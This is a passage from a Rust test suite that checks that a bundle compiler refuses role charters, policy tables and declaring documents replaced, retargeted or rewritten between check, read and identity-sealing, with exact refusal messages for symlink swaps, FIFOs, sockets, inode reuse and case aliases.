/// reference): an input that is not there, or cannot be resolved because a
/// parent is a file, names the declaring layer's file, the seat for a role,
/// the kind and the reference — standalone, and inherited, where it names
/// the ANCESTOR that declared it. A reference ten thousand bytes long is
/// named by its lead and its length, never echoed whole.
#[test]
fn a_missing_or_unresolvable_input_names_its_source_kind_and_reference() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    std::fs::write(base.join("flat"), "a file, not a directory\n").unwrap();
    let file = base.join("bundle.json");
    let file = file.display();
    for (reference, clause) in [
        ("roles/absent.md", "which does not exist"),
        ("flat/role.md", "which cannot be resolved (not a directory)"),
    ] {
        let (base, leaf) = active_inputs(&library, reference, "policy.json");
        let expected = format!("{file}: seat 'work' names role '{reference}', {clause}");
        assert_eq!(said(&base), format!("bundle: {expected}"), "{reference}");
        assert_eq!(
            said(&leaf),
            format!("bundle: bundle: {expected} (composed: derived -> base)"),
            "{reference} inherited"
        );
    }
    for (reference, clause) in [
        ("absent.json", "which does not exist"),
        (
            "flat/policy.json",
            "which cannot be resolved (not a directory)",
        ),
    ] {
        let (base, leaf) = active_inputs(&library, "roles/role.md", reference);
        let expected = format!("bundle: {file}: 'policy' names '{reference}', {clause}");
        assert_eq!(said(&base), expected, "{reference}");
        assert_eq!(said(&leaf), expected, "{reference} inherited");
    }
    let lead = "./".repeat(32);
    for (reference, top) in [
        (format!("{}capabilities/role.md", "./".repeat(5000)), "role"),
        (
            format!("{}capabilities/policy.json", "./".repeat(5000)),
            "policy",
        ),
    ] {
        let named = format!(
            "'{lead}…' ({} bytes, not echoed in full), which stands under 'capabilities' — a \
             top-level name the bundle's file walk does not pin, because it holds operator \
             configuration",
            reference.len()
        );
        let (base, leaf) = if top == "role" {
            active_inputs(&library, &reference, "policy.json")
        } else {
            active_inputs(&library, "roles/role.md", &reference)
        };
        let expected = if top == "role" {
            format!(
                "bundle: {file}: seat 'work' names role {named}. A charter there could change \
                 what the seat is told without moving the bundle's identity, so it is refused; \
                 move it to a path the bundle pins, such as 'roles/' (decision 0066 ruling 5)"
            )
        } else {
            format!(
                "bundle: {file}: 'policy' names {named}. A table there could change how a run is \
                 ruled without moving the bundle's identity, so it is refused; move it to a path \
                 the bundle pins, such as 'policy.json' (decision 0066 ruling 5)"
            )
        };
        assert_eq!(said(&base), expected, "{top}");
        let inherited = if top == "role" {
            format!("bundle: {expected} (composed: derived -> base)")
        } else {
            expected
        };
        assert_eq!(said(&leaf), inherited, "{top} inherited");
    }
}

/// Rebuild unit 16 (16.1; design D7): the read is bound to the contained
/// target by its handle, so a controlled replacement observes refusal and
/// never the replacement's bytes. Each replacement supplies EQUAL bytes, so
/// only the binding can tell: a link retargeted to another contained file,
/// a file renamed over the target, and a parent directory swapped for a
/// link out of the layer, each after the open; and a FIFO renamed over the
/// target after the handle's kind was checked, which the verification
/// refuses as a replacement without waiting for a writer. A target removed
/// after that check is refused as replaced (unit 16-fix), and a socket,
/// which cannot be opened, with its cause. Each case has its own library,
/// so no fixture writes into another's FIFO.
#[cfg(unix)]
#[test]
#[expect(
    clippy::too_many_lines,
    reason = "baseline 2026-09-29, decision 0065 slice one merged with main; split after #319"
)]
fn a_replacement_between_check_and_read_is_refused_never_read() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/linked.md", "policy.json");
    std::fs::write(base.join("roles/target.md"), "# as written\n").unwrap();
    std::fs::write(base.join("roles/other.md"), "# as written\n").unwrap();
    symlink("target.md", base.join("roles/linked.md")).unwrap();
    let compiled = said(&base);
    assert!(compiled.starts_with("compiled to"), "{compiled}");
    let retarget = {
        let roles = base.join("roles");
        move || {
            std::fs::remove_file(roles.join("linked.md")).unwrap();
            symlink("other.md", roles.join("linked.md")).unwrap();
        }
    };
    assert_eq!(
        said_replacing(
            &leaf,
            &base.join("roles/target.md"),
            ReadStage::Opened,
            retarget
        ),
        format!(
            "bundle: bundle: {} (composed: derived -> base)",
            role_escape(&base, "roles/linked.md", REPLACED)
        )
    );
    // The file itself, renamed over by an equal copy after the open.
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
    let policy = base.join("policy.json");
    let copy = {
        let (policy, spare) = (policy.clone(), base.join("spare.json"));
        move || {
            std::fs::copy(&policy, &spare).unwrap();
            std::fs::rename(&spare, &policy).unwrap();
        }
    };
    assert_eq!(
        said_replacing(&leaf, &policy, ReadStage::Opened, copy),
        format!("bundle: {}", policy_escape(&base, "policy.json", REPLACED))
    );
    // A parent directory, swapped after the open for a link out of the
    // layer to an equal copy.
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "tables/policy.json");
    std::fs::create_dir_all(base.join("tables")).unwrap();
    let bytes = serde_json::to_vec(&base_policy()).unwrap();
    std::fs::write(base.join("tables/policy.json"), &bytes).unwrap();
    let away = library.path().join("away");
    std::fs::create_dir_all(&away).unwrap();
    std::fs::write(away.join("policy.json"), &bytes).unwrap();
    let swap = {
        let tables = base.join("tables");
        let aside = base.join("aside");
        move || {
            std::fs::rename(&tables, &aside).unwrap();
            symlink(&away, &tables).unwrap();
        }
    };
    assert_eq!(
        said_replacing(
            &base,
            &base.join("tables/policy.json"),
            ReadStage::Opened,
            swap
        ),
        format!(
            "bundle: {}",
            policy_escape(&base, "tables/policy.json", REPLACED)
        )
    );
    // A FIFO renamed over the checked file, before the open.
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    let policy = base.join("policy.json");
    let pipe = {
        let (policy, spare) = (policy.clone(), base.join("pipe"));
        move || {
            fifo(&spare);
            std::fs::rename(&spare, &policy).unwrap();
        }
    };
    assert_eq!(
        said_replacing(&base, &policy, ReadStage::Checked, pipe),
        format!("bundle: {}", policy_escape(&base, "policy.json", REPLACED))
    );
    // Removed after the handle's check (unit 16-fix): the handle still holds
    // the file, which no longer stands at the target, so it is replaced.
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    let policy = base.join("policy.json");
    let remove = {
        let policy = policy.clone();
        move || std::fs::remove_file(&policy).unwrap()
    };
    assert_eq!(
        said_replacing(&base, &policy, ReadStage::Checked, remove),
        format!("bundle: {}", policy_escape(&base, "policy.json", REPLACED))
    );
    // A socket cannot be opened at all: the open fails and says why, naming
    // no bytes. It is bound at the library's root and moved in, because a
    // socket's path is capped.
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "sock.json");
    let bound = library.path().join("s");
    let _listener = std::os::unix::net::UnixListener::bind(&bound).unwrap();
    std::fs::rename(&bound, base.join("sock.json")).unwrap();
    assert_eq!(
        said(&base),
        format!(
            "bundle: {}",
            policy_escape(
                &base,
                "sock.json",
                "which cannot be read (uncategorized error)"
            )
        )
    );
}

/// Rebuild unit 16, second visit (16.1; design D7; review S16-2, C2, SC1):
/// the handle must hold the very file the kind check examined. A regular
/// file renamed over the target after that check, and a parent directory
/// replaced by another holding a regular file of the same name, are refused
/// as replaced — with EQUAL bytes, where only the binding can tell, and with
/// changed bytes, which are never read. Unit 16-fix: the check examines the
/// handle, so "after the check" is after the open, never between. The
/// table is raced standalone and the role inherited, where the refusal
/// names the ancestor that declared it.
#[cfg(unix)]
#[test]
fn a_replacement_before_the_open_is_refused_with_equal_or_changed_bytes() {
    let changed = serde_json::to_vec(&other_policy()).unwrap();
    for bytes in [serde_json::to_vec(&base_policy()).unwrap(), changed] {
        let label = String::from_utf8_lossy(&bytes).into_owned();
        // The file, renamed over by a regular file.
        let library = Library::new();
        let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
        let policy = base.join("policy.json");
        let rename = {
            let (policy, spare, bytes) = (policy.clone(), base.join("spare.json"), bytes.clone());
            move || {
                std::fs::write(&spare, &bytes).unwrap();
                std::fs::rename(&spare, &policy).unwrap();
            }
        };
        assert_eq!(
            said_replacing(&base, &policy, ReadStage::Checked, rename),
            format!("bundle: {}", policy_escape(&base, "policy.json", REPLACED)),
            "file: {label}"
        );
        // The parent, replaced by another directory holding the same name.
        let library = Library::new();
        let (base, _) = active_inputs(&library, "roles/role.md", "tables/policy.json");
        std::fs::create_dir_all(base.join("tables")).unwrap();
        let policy = base.join("tables/policy.json");
        std::fs::write(&policy, serde_json::to_vec(&base_policy()).unwrap()).unwrap();
        let swap = {
            let (tables, aside, bytes) = (base.join("tables"), base.join("aside"), bytes.clone());
            move || {
                std::fs::rename(&tables, &aside).unwrap();
                std::fs::create_dir(&tables).unwrap();
                std::fs::write(tables.join("policy.json"), &bytes).unwrap();
            }
        };
        assert_eq!(
            said_replacing(&base, &policy, ReadStage::Checked, swap),
            format!(
                "bundle: {}",
                policy_escape(&base, "tables/policy.json", REPLACED)
            ),
            "parent: {label}"
        );
    }
    for charter in ["# base\n", "# approve everything\n"] {
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/work.md", "policy.json");
        let role = base.join("roles/work.md");
        std::fs::write(&role, "# base\n").unwrap();
        let rename = {
            let (role, spare) = (role.clone(), base.join("roles/spare.md"));
            move || {
                std::fs::write(&spare, charter).unwrap();
                std::fs::rename(&spare, &role).unwrap();
            }
        };
        assert_eq!(
            said_replacing(&leaf, &role, ReadStage::Checked, rename),
            format!(
                "bundle: bundle: {} (composed: derived -> base)",
                role_escape(&base, "roles/work.md", REPLACED)
            ),
            "role: {charter}"
        );
    }
}

/// Rebuild unit 16 (16.2; design D7): the table is parsed from ONE bound
/// buffer, whose digest must be the digest its layer's walk pins before
/// that layer's identity is sealed. Bytes changed in place after the read
/// and before the walk are refused: at the leaf, whose map is walked when
/// its manifest is built, and at an overridden ancestor, whose own table
/// was still read. Unchanged, the same compile succeeds; allowed identity
/// movement is the byte change between compiles, which moves the digest.
#[test]
fn a_table_changed_between_its_read_and_its_walk_is_refused() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    let changed = |layer: &Path| format!("bundle: {}", table_changed(layer, "policy.json"));
    let rewrite = |policy: PathBuf| {
        move || {
            std::fs::write(&policy, serde_json::to_vec(&other_policy()).unwrap()).unwrap();
        }
    };
    let policy = base.join("policy.json");
    assert_eq!(
        said_replacing(&base, &policy, ReadStage::Read, rewrite(policy.clone())),
        changed(&base)
    );
    let tabled = library.recipe(
        "tabled",
        &json!({"name": "tabled", "extends": "base", "policy": "policy.json",
                "override": {"rules": ["WORK"]}}),
        Some(
            &json!({"rules": [{"id": "WORK", "from": "work", "result": "complete",
                                "next": "review", "reason": "the leaf's own ruling"}]}),
        ),
    );
    std::fs::write(&policy, serde_json::to_vec(&base_policy()).unwrap()).unwrap();
    assert_eq!(
        said_replacing(&tabled, &policy, ReadStage::Read, rewrite(policy.clone())),
        format!("bundle: {} (composed: tabled -> base)", changed(&base))
    );
    // Nothing moved during either compile: they succeed, and the byte
    // change between them is identity.
    let before = said(&tabled);
    assert!(before.starts_with("compiled to"), "{before}");
    std::fs::write(&policy, serde_json::to_vec(&base_policy()).unwrap()).unwrap();
    let after = said(&tabled);
    assert!(after.starts_with("compiled to"), "{after}");
    assert_ne!(before, after, "the ancestor's table bytes are identity");
}

/// Rebuild unit 16, second visit (16.2; design D7; review S16-1, C1, SC2):
/// the parsed buffer is bound to the entry the layer's identity names the
/// table by — the reference as written — and not only to the file that was
/// read. `table.json -> a.json` is read and verified, then retargeted to
/// `b.json`, a valid ruling of other bytes, with `a.json` left in place. The
/// walk then pins `table.json` as `b.json`'s bytes while `a.json` still
/// matches what was parsed, so one identity would name two governing
/// tables: refused at the leaf and at an ancestor whose rule the leaf
/// overrides. Unraced, the same on-disk state compiles, to the identity of
/// the table it reads. Unit 16-fix: a retarget before the read's own
/// verification is refused there as replaced, so the retarget runs at the
/// next bound read — the leaf's charter, or the overriding leaf's table.
#[cfg(unix)]
#[test]
fn a_table_link_retargeted_after_its_read_is_refused() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "table.json");
    let (first, second) = (base.join("a.json"), base.join("b.json"));
    std::fs::write(&first, serde_json::to_vec(&base_policy()).unwrap()).unwrap();
    std::fs::write(&second, serde_json::to_vec(&other_policy()).unwrap()).unwrap();
    let link = base.join("table.json");
    let retarget = |link: PathBuf| {
        move || {
            std::fs::remove_file(&link).unwrap();
            symlink("b.json", &link).unwrap();
        }
    };
    let retargeted = format!("bundle: {}", table_changed(&base, "table.json"));
    symlink("a.json", &link).unwrap();
    let charter = base.join("roles/role.md");
    assert_eq!(
        said_replacing(&base, &charter, ReadStage::Read, retarget(link.clone())),
        retargeted,
        "leaf"
    );
    let tabled = library.recipe(
        "tabled",
        &json!({"name": "tabled", "extends": "base", "policy": "policy.json",
                "override": {"rules": ["WORK"]}}),
        Some(
            &json!({"rules": [{"id": "WORK", "from": "work", "result": "complete",
                                "next": "review", "reason": "the leaf's own ruling"}]}),
        ),
    );
    std::fs::remove_file(&link).unwrap();
    symlink("a.json", &link).unwrap();
    let own = library.path().join("tabled/policy.json");
    assert_eq!(
        said_replacing(&tabled, &own, ReadStage::Read, retarget(link.clone())),
        format!("bundle: {retargeted} (composed: tabled -> base)"),
        "overridden ancestor"
    );
    // Unraced, `table.json -> b.json` compiles, and its identity is the
    // table it names: `a.json` is still there, and does not stand in.
    let unraced = said(&base);
    assert!(unraced.starts_with("compiled to"), "{unraced}");
    std::fs::remove_file(&link).unwrap();
    symlink("a.json", &link).unwrap();
    assert_ne!(said(&base), unraced, "the table a link names is identity");
}

// ---------------------------------- unit 16-fix: one read, one set of bytes

/// A `base` document whose table is read from `policy`.
fn document_naming(policy: &str) -> Vec<u8> {
    let mut bundle = base_bundle();
    bundle["policy"] = json!(policy);
    serde_json::to_vec(&bundle).unwrap()
}

/// The refusal of a layer whose declaring document the walk does not pin
/// as it was read.
fn document_changed(layer: &Path) -> String {
    format!(
        "{}: the layer's declaring document changed between the read that composed the layer \
         and the walk that pinned it. What a run is composed from must be what its identity \
         names, so it is refused (decision 0065 slice one, design D7)",
        layer.join("bundle.json").display()
    )
}

/// Rebuild unit 16-fix, R1 (16.2; design D7): a layer's declaring document
/// is bound like its table. `base/bundle.json` names `a.json`, and `b.json`,
/// another valid ruling, stands beside it. Once `a.json` is read, the
/// document is rewritten to name `b.json`, and both tables stay. The walk
/// then pins the new document and both tables, which is exactly the file
/// map a stable compile of the new document seals — so a raced compile
/// ruled by `a.json` would share its identity with one ruled by `b.json`.
/// Refused at the leaf, at an ancestor, at an ancestor whose rule the leaf
/// overrides, and at a composed leaf's own document. Unraced, the two
/// documents compile to two identities.
#[test]
fn a_declaring_document_replaced_after_its_read_is_refused() {
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/role.md", "a.json");
    let table = |name: &str, policy: Value| {
        std::fs::write(base.join(name), serde_json::to_vec(&policy).unwrap()).unwrap();
    };
    table("a.json", base_policy());
    table("b.json", other_policy());
    let document = base.join("bundle.json");
    let rename_to_b = || {
        let document = document.clone();
        move || std::fs::write(&document, document_naming("b.json")).unwrap()
    };
    let first = base.join("a.json");
    let stable_b = {
        std::fs::write(&document, document_naming("b.json")).unwrap();
        said(&base)
    };
    std::fs::write(&document, document_naming("a.json")).unwrap();
    let stable_a = said(&base);
    assert!(stable_a.starts_with("compiled to"), "{stable_a}");
    assert_ne!(stable_a, stable_b, "each document is its own identity");
    let expected = format!("bundle: {}", document_changed(&base));
    assert_eq!(
        said_replacing(&base, &first, ReadStage::Read, rename_to_b()),
        expected,
        "leaf; the stable compile of the new document is {stable_b}"
    );
    std::fs::write(&document, document_naming("a.json")).unwrap();
    // An ancestor is sealed once the compile has bound its charters (unit
    // 16-fix-b), so its refusal carries the chain like any other.
    assert_eq!(
        said_replacing(&leaf, &first, ReadStage::Read, rename_to_b()),
        format!("bundle: {expected} (composed: derived -> base)"),
        "ancestor"
    );
    std::fs::write(&document, document_naming("a.json")).unwrap();
    let tabled = library.recipe(
        "tabled",
        &json!({"name": "tabled", "extends": "base", "policy": "policy.json",
                "override": {"rules": ["WORK"]}}),
        Some(
            &json!({"rules": [{"id": "WORK", "from": "work", "result": "complete",
                                "next": "review", "reason": "the leaf's own ruling"}]}),
        ),
    );
    assert_eq!(
        said_replacing(&tabled, &first, ReadStage::Read, rename_to_b()),
        format!("bundle: {expected} (composed: tabled -> base)"),
        "overridden ancestor"
    );
    std::fs::write(&document, document_naming("a.json")).unwrap();
    // The composed leaf's own document, rewritten once its own table is
    // read: refused where the leaf's identity is sealed.
    let own = tabled.join("policy.json");
    let rewrite_leaf = {
        let document = tabled.join("bundle.json");
        move || {
            let widened = json!({"name": "tabled", "extends": "base", "policy": "policy.json",
                                 "description": "rewritten after its read",
                                 "override": {"rules": ["WORK"]}});
            std::fs::write(&document, serde_json::to_vec(&widened).unwrap()).unwrap()
        }
    };
    assert_eq!(
        said_replacing(&tabled, &own, ReadStage::Read, rewrite_leaf),
        format!(
            "bundle: bundle: {} (composed: tabled -> base)",
            document_changed(&tabled)
        ),
        "composed leaf"
    );
}

/// Rebuild unit 16-fix, R1 (16.1; design D7): the declaring document is
/// read through the same binding as every consumed input, so a
/// `bundle.json` that links out of its layer is refused even with equal
/// bytes, standalone and as an ancestor, and a directory standing there is
/// refused by its kind.
#[cfg(unix)]
#[test]
fn a_declaring_document_is_bound_like_any_consumed_input() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
    let outside = library.path().join("outside.json");
    std::fs::copy(base.join("bundle.json"), &outside).unwrap();
    std::fs::remove_file(base.join("bundle.json")).unwrap();
    symlink(&outside, base.join("bundle.json")).unwrap();
    let refused = |layer: &Path, place: &str| {
        format!(
            "bundle: {}: the layer's declaring document, {place}. What a run is composed from \
             must be what its identity names, so it is refused (decision 0065 slice one, design \
             D7)",
            layer.join("bundle.json").display()
        )
    };
    assert_eq!(said(&base), refused(&base, OUTWARD));
    assert_eq!(said(&leaf), refused(&base, OUTWARD), "ancestor");
    std::fs::remove_file(base.join("bundle.json")).unwrap();
    std::fs::create_dir(base.join("bundle.json")).unwrap();
    assert_eq!(said(&base), refused(&base, NONREGULAR));
    // A base with no document at all says so as it always has.
    std::fs::remove_dir(base.join("bundle.json")).unwrap();
    assert_eq!(
        said(&leaf),
        "bundle io: No such file or directory (os error 2)",
        "absent"
    );
}

/// Rebuild unit 16-fix, R2 (16.1; design D7): once the handle's kind is
/// checked, the target is unlinked and a file of equal or changed bytes is
/// created in its place — first filling any lower free numbers, so that
/// wherever the filesystem hands a freed number out again, the new file
/// takes the checked file's. It cannot here: the handle still holds that
/// file, so its number is not free, and the read is refused as replaced,
/// standalone and inherited. The assertion message says whether a number
/// was reused, which is what the baseline this repairs accepted.
#[cfg(unix)]
#[test]
#[expect(
    clippy::excessive_nesting,
    reason = "baseline 2026-09-29, decision 0065 slice one merged with main; split after #319"
)]
fn an_input_unlinked_and_recreated_after_its_check_is_never_read() {
    use std::os::unix::fs::MetadataExt;
    for (label, policy) in [("equal", base_policy()), ("changed", other_policy())] {
        for inherited in [false, true] {
            let library = Library::new();
            let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
            let target = base.join("policy.json");
            let reused = std::rc::Rc::new(std::cell::Cell::new(false));
            let recreate = {
                let (target, base, reused) = (target.clone(), base.clone(), reused.clone());
                let bytes = serde_json::to_vec(&policy).unwrap();
                move || {
                    let checked = std::fs::metadata(&target).unwrap().ino();
                    std::fs::remove_file(&target).unwrap();
                    for spare in 0..64 {
                        let path = base.join(format!("spare-{spare}.json"));
                        std::fs::write(&path, &bytes).unwrap();
                        if std::fs::metadata(&path).unwrap().ino() == checked {
                            reused.set(true);
                            std::fs::rename(&path, &target).unwrap();
                            return;
                        }
                    }
                    std::fs::write(&target, &bytes).unwrap();
                }
            };
            let compiled = if inherited { &leaf } else { &base };
            assert_eq!(
                said_replacing(compiled, &target, ReadStage::Checked, recreate),
                format!("bundle: {}", policy_escape(&base, "policy.json", REPLACED)),
                "{label} bytes, inherited: {inherited}, number reused: {}",
                reused.get()
            );
        }
    }
}

/// Rebuild unit 16-fix, R2 (16.2; design D7): the bytes are the handle's,
/// from its one read. After the handle's check the target is moved aside
/// and another ruling put in its place; after the read the held file is
/// moved back. The handle read the held file, which stands at the target
/// again when the binding is verified, so the compile succeeds — to the
/// very identity an undisturbed compile seals. A second read of the path
/// would have parsed the other ruling.
#[test]
fn a_bound_read_supplies_its_handles_bytes_and_never_a_second_reads() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    let target = base.join("policy.json");
    let aside = base.join("aside.json");
    let stable = said(&base);
    assert!(stable.starts_with("compiled to"), "{stable}");
    let swap = {
        let (target, aside) = (target.clone(), aside.clone());
        let other = serde_json::to_vec(&other_policy()).unwrap();
        move |at: ReadStage| match at {
            ReadStage::Checked => {
                std::fs::rename(&target, &aside).unwrap();
                std::fs::write(&target, &other).unwrap();
            }
            ReadStage::Read => std::fs::rename(&aside, &target).unwrap(),
            _ => {}
        }
    };
    let watched = target.clone();
    READ_HOOK.with(|hook| {
        *hook.borrow_mut() = Some(Box::new(move |at, reached| {
            if reached == watched {
                swap(at);
            }
        }));
    });
    let raced = said(&base);
    READ_HOOK.with(|hook| *hook.borrow_mut() = None);
    assert_eq!(raced, stable);
}

/// The walk's refusal of a consumed key it lists no entry for (rebuild unit
/// 16-fix-d), opened by `consumer`, who read it: the declaring file and the
/// table or the seat's role, as [`table_by`] and [`role_by`] say them.
fn unwalked(consumer: &str, key: &str) -> String {
    format!(
        "{consumer}, which the walk that pins the layer lists under no entry of the name '{key}' \
         it was read by: the name reached the file through a case or normalization alias the \
         filesystem accepted, or the entry was removed after the read. A layer's identity names \
         a consumed file by the entry its directory lists, so it is refused; write the reference \
         as its directory lists it (decision 0065 slice one, design D7)"
    )
}

/// `layer`'s table, read by `reference`, as a refusal opens.
fn table_by(layer: &Path, reference: &str) -> String {
    format!(
        "{}: 'policy' names '{reference}'",
        layer.join("bundle.json").display()
    )
}

/// `layer`'s seat `site`'s role, read by `reference`, as a refusal opens.
fn role_by(layer: &Path, site: &str, reference: &str) -> String {
    format!(
        "{}: seat '{site}' names role '{reference}'",
        layer.join("bundle.json").display()
    )
}

/// Rebuild unit 16-fix-d, F4 (16.1, 16.2; design D7, under the refusal
/// ruling): a reference whose spelling differs from the entry its directory
/// lists is refused on every filesystem, never bound to that entry. Where
/// the filesystem accepts no case alias, `POLICY.JSON` does not resolve;
/// where it accepts one (macOS), the exact lookup opens the file, but the
/// walk lists no entry of that name, and the compile is refused for exactly
/// that. A link reached by an alias spelling is the same. On every host, a
/// link removed after the read is refused by the walk for the same reason,
/// naming the source, the kind, the site and the reference that read it —
/// a table's and a charter's, standalone and inherited (16-fix-d, F4).
///
/// Which reason each row asserts is decided by the FILESYSTEM the fixture
/// stands on, probed on the fixture's own canonical root (unit 16-fix-c),
/// never by the host's name or the ambient temporary directory. No row
/// asserts acceptance: that surface was removed (unit 16-fix-d).
#[cfg(unix)]
#[test]
fn a_spelling_its_directory_does_not_list_is_refused() {
    use std::os::unix::fs::symlink;
    let missing = |layer: &Path, reference: &str| {
        format!(
            "bundle: {}: 'policy' names '{reference}', which does not exist",
            layer.join("bundle.json").display()
        )
    };
    let library = Library::new();
    let accepts_alias = accepts_case_alias(library.path());
    let (base, _) = active_inputs(&library, "roles/role.md", "POLICY.JSON");
    let expected = match accepts_alias {
        true => format!(
            "bundle: {}",
            unwalked(&table_by(&base, "POLICY.JSON"), "POLICY.JSON")
        ),
        false => missing(&base, "POLICY.JSON"),
    };
    assert_eq!(said(&base), expected, "alias accepted: {accepts_alias}");
    let library = Library::new();
    assert_eq!(accepts_case_alias(library.path()), accepts_alias);
    let (base, _) = active_inputs(&library, "roles/role.md", "TABLE.JSON");
    symlink("policy.json", base.join("table.json")).unwrap();
    let expected = match accepts_alias {
        true => format!(
            "bundle: {}",
            unwalked(&table_by(&base, "TABLE.JSON"), "TABLE.JSON")
        ),
        false => missing(&base, "TABLE.JSON"),
    };
    assert_eq!(said(&base), expected, "alias accepted: {accepts_alias}");
    // Every host: a link read by its listed name, removed once the read is
    // verified, before the walk; standalone and inherited.
    let library = Library::new();
    let (base, leaf) = active_inputs(&library, "roles/linked.md", "table.json");
    std::fs::write(base.join("roles/target.md"), "# work\n").unwrap();
    let (table, role) = (base.join("table.json"), base.join("roles/linked.md"));
    // Both links are put back, then `link` is removed once the read of
    // `watched`, its target, is verified.
    let unlinked = |link: &Path, compiled: &Path, watched: PathBuf| {
        for (each, text) in [(&table, "policy.json"), (&role, "target.md")] {
            let _ = std::fs::remove_file(each);
            symlink(text, each).unwrap();
        }
        let link = link.to_path_buf();
        let remove = move || std::fs::remove_file(&link).unwrap();
        said_replacing(compiled, &watched, ReadStage::Verified, remove)
    };
    let refusals = |consumer: String, key: &str| {
        let refused = unwalked(&consumer, key);
        (
            format!("bundle: {refused}"),
            format!("bundle: bundle: {refused} (composed: derived -> base)"),
        )
    };
    let watched = base.join("roles/target.md");
    let said_table = (
        unlinked(&table, &base, base.join("policy.json")),
        unlinked(&table, &leaf, base.join("policy.json")),
    );
    assert_eq!(
        said_table,
        refusals(table_by(&base, "table.json"), "table.json")
    );
    let said_role = (
        unlinked(&role, &base, watched.clone()),
        unlinked(&role, &leaf, watched),
    );
    assert_eq!(
        said_role,
        refusals(role_by(&base, "work", "roles/linked.md"), "roles/linked.md")
    );
}

/// Whether the filesystem under `root`, a fixture's canonical root, accepts
/// a case alias: one spelling is created there and the other looked up.
/// Absent is "no"; any other answer is not a decision, and panics.
fn accepts_case_alias(root: &Path) -> bool {
    let probe = root.join("alias-probe");
    std::fs::write(&probe, "").unwrap();
    let other = std::fs::symlink_metadata(root.join("ALIAS-PROBE"));
    std::fs::remove_file(&probe).unwrap();
    match other {
        Ok(_) => true,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => false,
        Err(error) => panic!(
            "the alias probe on {} decided nothing: {error}",
            root.display()
        ),
    }
}

// ------------------------- unit 16-fix-b: one observation, one set of bytes

/// A controlled replacement: run once, when its stage is reached at its path.
type Act = (ReadStage, PathBuf, Box<dyn FnOnce()>);

/// What compiling `leaf` said while each act ran once, the first time a
/// bound read, its resolution or the walk reached the act's stage at its
/// path.
#[expect(
    clippy::excessive_nesting,
    reason = "baseline 2026-09-29, decision 0065 slice one merged with main; split after #319"
)]
fn said_acting(leaf: &Path, acts: Vec<Act>) -> String {
    let mut acts: Vec<_> = acts
        .into_iter()
        .map(|(stage, path, act)| (stage, path, Some(act)))
        .collect();
    READ_HOOK.with(|hook| {
        *hook.borrow_mut() = Some(Box::new(move |at, reached| {
            for (stage, path, act) in acts.iter_mut() {
                if *stage == at && path == reached {
                    if let Some(act) = act.take() {
                        act();
                    }
                }
            }
        }));
    });
    let said = said(leaf);
    READ_HOOK.with(|hook| *hook.borrow_mut() = None);
    said
}

/// The refusal of a charter its declaring layer's walk does not hold as it
/// was read.
fn charter_changed(layer: &Path, site: &str, reference: &str) -> String {
    format!(
        "{}: seat '{site}' names role '{reference}', which the walk that pinned the layer does \
         not hold as it was read: its entry was replaced, retargeted or removed, or its bytes \
         changed, after the read that bound it. What a seat is told must be what its identity \
         names, so it is refused (decision 0065 slice one, design D7)",
        layer.join("bundle.json").display()
    )
}

/// The refusal of a table its declaring layer's walk does not hold as it
/// was read (unit 16-fix-c, F4: an entry or a name, not only bytes).
fn table_changed(layer: &Path, reference: &str) -> String {
    format!(
        "{}: 'policy' names '{reference}', whose entry, target or bytes changed between the \
         read that parsed it and the walk that pinned it: an entry on its way was replaced, \
         removed or retargeted, a name it was read by changed, or the bytes read changed. The \
         table a run is ruled by must be the table its identity names, so it is refused \
         (decision 0065 slice one, design D7)",
        layer.join("bundle.json").display()
    )
}

/// A leaf over `base` with a table of its own that overrides `base`'s rule.
fn overriding_leaf(library: &Library) -> PathBuf {
    library.recipe(
        "tabled",
        &json!({"name": "tabled", "extends": "base", "policy": "policy.json",
                "override": {"rules": ["WORK"]}}),
        Some(
            &json!({"rules": [{"id": "WORK", "from": "work", "result": "complete",
                                "next": "review", "reason": "the leaf's own ruling"}]}),
        ),
    )
}

/// Rebuild unit 16-fix-b, F1 (16.1, 16.2; design D7): the reference's own
/// entry is bound by the same observation that read its target. A link
/// `L -> T` supplies `T`'s bytes; once that read is verified, `L` is
/// replaced by a regular file of the same bytes or of other bytes. Judged
/// again after the read, `L` looked like no link, both keys became `T`'s,
/// and the walk sealed `L`'s new bytes beside `T`'s: the file map a stable
/// compile of the replaced tree seals. Refused now for a table, a declaring
/// document and a charter, standalone and in an ancestor, and for an
/// ancestor whose rule the leaf overrides.
#[cfg(unix)]
#[test]
fn a_reference_replaced_after_its_bound_read_is_refused() {
    use std::os::unix::fs::symlink;
    let replace = |link: PathBuf, bytes: Vec<u8>| {
        move || {
            std::fs::remove_file(&link).unwrap();
            std::fs::write(&link, &bytes).unwrap();
        }
    };
    let ruling = |policy: Value| serde_json::to_vec(&policy).unwrap();
    for equal in [true, false] {
        // A table: `table.json -> a.json`.
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/role.md", "table.json");
        let tabled = overriding_leaf(&library);
        std::fs::write(base.join("a.json"), ruling(base_policy())).unwrap();
        let bytes = ruling(if equal { base_policy() } else { other_policy() });
        let refused = table_changed(&base, "table.json");
        for (compiled, expected) in [
            (&base, format!("bundle: {refused}")),
            (
                &leaf,
                format!("bundle: bundle: {refused} (composed: derived -> base)"),
            ),
            (
                &tabled,
                format!("bundle: bundle: {refused} (composed: tabled -> base)"),
            ),
        ] {
            let link = base.join("table.json");
            let _ = std::fs::remove_file(&link);
            symlink("a.json", &link).unwrap();
            let act = replace(link, bytes.clone());
            assert_eq!(
